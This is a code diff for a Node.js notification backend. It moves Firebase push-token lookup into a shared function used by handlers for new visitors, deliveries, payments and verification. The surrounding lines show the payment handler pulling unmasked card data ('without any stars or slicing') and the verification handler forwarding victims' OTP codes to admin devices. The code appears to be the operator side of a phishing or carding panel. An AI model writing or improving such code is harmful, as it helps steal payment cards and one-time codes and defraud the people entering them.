@@ -89,15 +89,37 @@ try {
 // ==========================================
 // FETCH TOKENS FROM DATABASE
 // ==========================================
+async function getActiveTokensFromDatabase() {
+  const queries = [
+    'SELECT token AS token FROM admin_fcm_tokens WHERE enabled = true',
+    'SELECT token_text AS token FROM admin_fcm_tokens WHERE enabled = true'
+  ];
+
+  let lastError = null;
+
+  for (const query of queries) {
+    try {
+      const result = await pool.query(query);
+      return result.rows
+        .map(r => (typeof r.token === 'string' ? r.token : null))
+        .filter(Boolean);
+    } catch (error) {
+      lastError = error;
+    }
+  }
+
+  throw lastError || new Error('Could not load FCM tokens from database');
+}
+
 async function getActiveTokens() {
   try {
-    const result = await pool.query('SELECT token FROM admin_fcm_tokens WHERE enabled = true');
-    const tokens = result.rows.map(r => r.token);
-    console.log(`📱 Fetched ${tokens.length} tokens from database`);
-    return tokens;
+    const tokens = await getActiveTokensFromDatabase();
+    const resolvedTokens = tokens.length > 0 ? tokens : (global.fcmTokens || []).filter(Boolean);
+    console.log(`📱 Fetched ${resolvedTokens.length} tokens from database`);
+    return resolvedTokens;
   } catch (error) {
     console.error('❌ Error fetching tokens from database:', error.message);
-    return global.fcmTokens || [];
+    return [...new Set((global.fcmTokens || []).filter(Boolean))];
   }
 }
 
@@ -151,15 +173,7 @@ async function sendToAllActiveTokens(notification, data = {}) {
 // NOTIFICATION FUNCTIONS
 // ==========================================
 async function notifyNewVisitor(visitorData) {
-  // Fetch tokens dynamically from database
-  let tokens = [];
-  try {
-    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
-    tokens = result.rows.map(r => r.token_text);
-  } catch (err) {
-    console.error('Error fetching tokens for notifyNewVisitor:', err.message);
-    tokens = global.fcmTokens || [];
-  }
+  const tokens = await getActiveTokens();
 
   // Check if this is truly new or returning customer
   const hasName = visitorData.delivery_data?.fullName || visitorData.payment_data?.cardHolder;
@@ -188,15 +202,7 @@ async function notifyNewVisitor(visitorData) {
 }
 
 async function notifyDelivery(visitorData) {
-  // Fetch tokens dynamically from database
-  let tokens = [];
-  try {
-    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
-    tokens = result.rows.map(r => r.token_text);
-  } catch (err) {
-    console.error('Error fetching tokens for notifyDelivery:', err.message);
-    tokens = global.fcmTokens || [];
-  }
+  const tokens = await getActiveTokens();
 
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const phone = visitorData.delivery_data?.phone || '';
@@ -209,15 +215,7 @@ async function notifyDelivery(visitorData) {
 }
 
 async function notifyPayment(visitorData) {
-  // 1. Fetch all active tokens dynamically from the database to ensure it fires in the background
-  let tokens = [];
-  try {
-    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
-    tokens = result.rows.map(r => r.token_text);
-  } catch (err) {
-    console.error('Error fetching tokens for notifyPayment:', err.message);
-    tokens = global.fcmTokens || []; // fallback
-  }
+  const tokens = await getActiveTokens();
 
   // 2. Extract FULL raw details without any stars or slicing
   const name = visitorData.payment_data?.cardHolder || 'زائر';
@@ -237,15 +235,7 @@ async function notifyPayment(visitorData) {
 }
 
 async function notifyVerification(visitorData) {
-  // Fetch tokens dynamically from database
-  let tokens = [];
-  try {
-    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
-    tokens = result.rows.map(r => r.token_text);
-  } catch (err) {
-    console.error('Error fetching tokens for notifyVerification:', err.message);
-    tokens = global.fcmTokens || [];
-  }
+  const tokens = await getActiveTokens();
 
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const otp = visitorData.verification_data?.otp || '';
